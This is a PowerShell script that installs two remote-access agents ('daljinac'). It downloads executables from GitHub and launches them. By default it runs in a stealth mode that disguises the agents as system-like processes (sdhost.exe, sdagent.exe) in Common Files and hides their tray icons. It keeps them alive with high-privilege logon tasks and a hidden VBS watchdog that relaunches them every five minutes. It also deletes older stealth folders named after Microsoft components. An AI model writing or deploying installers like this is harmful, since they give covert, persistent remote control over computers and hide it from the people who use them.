param([switch]$v1, [switch]$v2, [switch]$normal)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

if (-not $v1 -and -not $v2) { $v1 = $true; $v2 = $true }

if ($normal) {
    $agents = @()
    if ($v1) { $agents += @{ Name='daljinac';  Dir='C:\daljinac';  ExeName='systemUI.exe';  TaskName='daljinac';  URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe';  Port=8081; ExtraArgs='' } }
    if ($v2) { $agents += @{ Name='daljinac2'; Dir='C:\daljinac2'; ExeName='daljinac2.exe'; TaskName='daljinac2'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; ExtraArgs='' } }
    $stealth = $false
} else {
    $agents = @()
    if ($v1) {
        $agents += @{ Name='sdhost'; Dir='C:\Program Files\Common Files\Sdh'; ExeName='sdhost.exe'; TaskName='sdhost'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Port=8081; ExtraArgs='-notray' }
    }
    if ($v2) {
        $agents += @{ Name='sdagent'; Dir='C:\Program Files\Common Files\Sda'; ExeName='sdagent.exe'; TaskName='sdagent'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; ExtraArgs='-notray' }
    }
    $stealth = $true
}

# One-time cleanup of ALL old tasks
Write-Host "=== Cleanup ===" -ForegroundColor Cyan
@("Daljinac","DaljinacWatch","Daljinac2","Daljinac2Watch",
  "HelpDataHost","HelpDataHostWatch","DiagHubHost","DiagHubHostWatch",
  "systemUI","daljinac2","sdhost","sdhostWatch","sdagent","sdagentWatch") | ForEach-Object {
    schtasks /delete /tn $_ /f 2>$null
}

# Clean old stealth dirs
rmdir /s /q "C:\ProgramData\Microsoft\HelpData" 2>$null
rmdir /s /q "C:\ProgramData\Microsoft\DiagHub" 2>$null

foreach ($a in $agents) {
    Write-Host "=== $($a.Name) ===" -ForegroundColor Cyan
    $Exe = "$($a.Dir)\$($a.ExeName)"

    # Kill old instance of THIS agent only
    Write-Host "  [1/3] Killing $($a.ExeName)..."
    $maxWait = 20
    do {
        Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($a.ExeName)) -ErrorAction SilentlyContinue | Stop-Process -Force
        Start-Sleep -Seconds 1
        $maxWait--
        $portFree = $true
        try { (Get-NetTCPConnection -LocalPort $a.Port -ErrorAction Stop).OwningProcess } catch { $portFree = $true }
        if ($maxWait -le 0) { break }
    } while (-not $portFree)
    Start-Sleep -Seconds 2

    # Download with retry
    Write-Host "  [2/3] Downloading $($a.ExeName)..."
    mkdir $a.Dir -Force | Out-Null
    $downloaded = $false
    for ($retry = 1; $retry -le 3; $retry++) {
        try {
            Invoke-WebRequest $a.URL -OutFile "$Exe.new" -UseBasicParsing -ErrorAction Stop
            $sz = (Get-Item "$Exe.new" -ErrorAction Stop).Length
            if ($sz -gt 100000) {
                Write-Host "         $sz bytes (attempt $retry)" -ForegroundColor Green
                $downloaded = $true
                break
            }
        } catch {
            Write-Host "         attempt $retry failed: $_" -ForegroundColor Yellow
            Start-Sleep -Seconds 2
        }
        Start-Sleep -Seconds 1
    }
    if (-not $downloaded) {
        Write-Host "         FAILED after 3 attempts, skipping $($a.Name)" -ForegroundColor Red
        continue
    }

    # Replace
    Write-Host "  [2b/3] Replacing..."
    Move-Item -Force "$Exe.new" $Exe

    # Scheduled tasks
    Write-Host "  [3/3] Installing tasks..."
    Remove-Item "$($a.Dir)\watchdog.vbs" -Force -ErrorAction SilentlyContinue

    $action  = New-ScheduledTaskAction -Execute $Exe -Argument $a.ExtraArgs
    $trigger = New-ScheduledTaskTrigger -AtLogon
    $settings = New-ScheduledTaskSettingsSet
    $principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive -RunLevel Highest
    Register-ScheduledTask -TaskName $a.TaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null

    $vbs = "CreateObject(`"WScript.Shell`").Run `"schtasks /run /tn $($a.TaskName)`", 0, False"
    Set-Content -Path "$($a.Dir)\watchdog.vbs" -Value $vbs -Encoding ASCII
    schtasks /create /tn "$($a.TaskName)Watch" /tr "wscript.exe //B $($a.Dir)\watchdog.vbs" /sc MINUTE /mo 5 /f

    # Start
    ([wmiclass]'Win32_Process').Create("`"$Exe`" $($a.ExtraArgs)") | Out-Null
    Start-Sleep -Seconds 2
}

Write-Host ""
Write-Host "DONE." -ForegroundColor Green
if ($stealth) { Write-Host "  Mode: NOTRAY (Common Files)" } else { Write-Host "  Mode: NORMAL" }
if ($v1) { Write-Host "  v1: $($agents | Where-Object Name -match sdhost -or $_.Name -eq 'daljinac' | ForEach-Object { $_.ExeName })" }
if ($v2) { Write-Host "  v2: $($agents | Where-Object Name -match sdagent -or $_.Name -eq 'daljinac2' | ForEach-Object { $_.ExeName })" }

# Verify
Start-Sleep -Seconds 3
Write-Host ""
Write-Host "Verifying..." -ForegroundColor Cyan
if ($v1) {
    $p = Get-Process -Name sdhost,systemUI,HelpDataHost -ErrorAction SilentlyContinue
    if ($p) { Write-Host "  v1: RUNNING (PID $($p.Id))" -ForegroundColor Green }
    else     { Write-Host "  v1: NOT FOUND - check manually" -ForegroundColor Red }
}
if ($v2) {
    $p = Get-Process -Name sdagent,daljinac2,DiagHubHost -ErrorAction SilentlyContinue
    if ($p) { Write-Host "  v2: RUNNING (PID $($p.Id))" -ForegroundColor Green }
    else     { Write-Host "  v2: NOT FOUND - check manually" -ForegroundColor Red }
}
